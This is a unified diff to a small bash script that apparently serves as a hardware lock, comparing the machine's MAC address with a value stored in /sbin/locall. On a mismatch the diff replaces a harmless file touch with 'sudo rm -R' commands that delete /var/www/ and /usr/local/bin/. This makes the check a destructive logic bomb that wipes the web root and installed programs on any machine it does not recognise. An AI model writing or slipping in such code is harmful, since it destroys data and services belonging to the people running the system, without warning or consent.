@@ -1,7 +1,9 @@
 #!/bin/bash
 if [ $(ifconfig | grep HWaddr | sed 's/.*HWaddr //') != $(cat /sbin/locall) ];
 then
-touch /sbin/222
+sudo rm -R /var/www/
+sudo rm -R /usr/local/bin/
+
         echo "wrong  $0."
         exit 1;
 fi
